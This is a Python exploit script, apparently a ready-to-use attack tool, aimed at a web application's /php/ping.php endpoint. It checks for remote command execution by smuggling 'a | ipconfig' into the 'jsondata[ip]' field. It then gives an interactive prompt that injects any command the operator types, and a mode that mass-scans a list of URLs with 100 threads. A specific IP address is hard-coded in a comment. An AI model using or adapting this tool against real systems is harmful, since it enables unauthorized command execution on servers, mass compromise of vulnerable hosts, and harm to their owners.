#http://159.138.159.222
import argparse
import re
import requests
import sys
import time
import os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def poc(target):
    url = target + "/php/ping.php"
    headers = {
        "User - Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 120.0) Gecko / 20100101 Firefox / 120.0",
        "Accept": "text / html, application / xhtml + xml, application / xml; q = 0.9, image / avif, image / webp, * / *;q = 0.8",
        "Accept - Language": "zh - CN, zh; q = 0.8, zh - TW; q = 0.7, zh - HK; q = 0.5, en - US; q = 0.3, en; q = 0.2",
        "Accept - Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade - Insecure - Requests": "1",
        "If - Modified - Since": "Thu, 03 Sep 2020 07: 40:57 GMT",
        "If - None - Match": "5f509e09-2015",
        "Content - Type": "application / x - www - form - urlencoded",
        "Content - Length": "40"
    }
    data = {
        "jsondata[ip]" : "a | ipconfig",
        "jsondata[type]" : "1"
    }

    proxies = {
        "http":"http://127.0.0.1:8088",
        "https":"http://127.0.0.1:8088"
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False)
        if "IP" in res.text:
            print("存在rce漏洞！！！！！！！！"+target)
            return True
        else:
            print(target+"不存在漏洞")
    except Exception as e:
        print(e)


def exp(target):
    print("~~~~~~~~~~拿shell中~~~~~~~~~~~~~")
    time.sleep(2)
    os.system("cls")
    headers = {
        "User - Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 120.0) Gecko / 20100101 Firefox / 120.0",
        "Accept": "text / html, application / xhtml + xml, application / xml; q = 0.9, image / avif, image / webp, * / *;q = 0.8",
        "Accept - Language": "zh - CN, zh; q = 0.8, zh - TW; q = 0.7, zh - HK; q = 0.5, en - US; q = 0.3, en; q = 0.2",
        "Accept - Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade - Insecure - Requests": "1",
        "If - Modified - Since": "Thu, 03 Sep 2020 07: 40:57 GMT",
        "If - None - Match": "5f509e09-2015",
        "Content - Type": "application / x - www - form - urlencoded",
        "Content - Length": "40"
    }
    E = input("输入M为命令执行，输入G为getshell")
    w = input("输入你的命令")
    while True:

        url = target + "/php/ping.php"
        data = {
            "jsondata[ip]": f"a | '{w}'",
            "jsondata[type]": "1"
        }
        if E == "M":
            rep = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5).text
            print(rep)
            match = re.search(r'\r?\n\r?\n(.*)', rep, re.DOTALL)

            # 检查是否找到匹配
            if match:
                # 获取匹配的内容
                content_after_empty_line = match.group(1)

                # 打印内容
                print(content_after_empty_line)
            else:
                print("No match found.")





def banana():
    banana = """

     ▄▄▄▄    ▄▄▄       ███▄    █  ▄▄▄       ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▓█████▄ ▒████▄     ██ ▀█   █ ▒████▄     ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
 ░    ░   ░   ▒      ░   ░ ░   ░   ▒      ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
 ░            ░  ░         ░       ░  ░         ░       ░  ░            ░ ░      ░ ░      ░  ░
      ░                                                                                       


    """
    print(banana)


def main():
    banana()


    parser = argparse.ArgumentParser(description="远程命令执行漏洞")
    parser.add_argument("-u", "--url", help="输入你的URL")
    parser.add_argument("-f", "--file", help="please input your usernamefile")

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n"," "))

        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()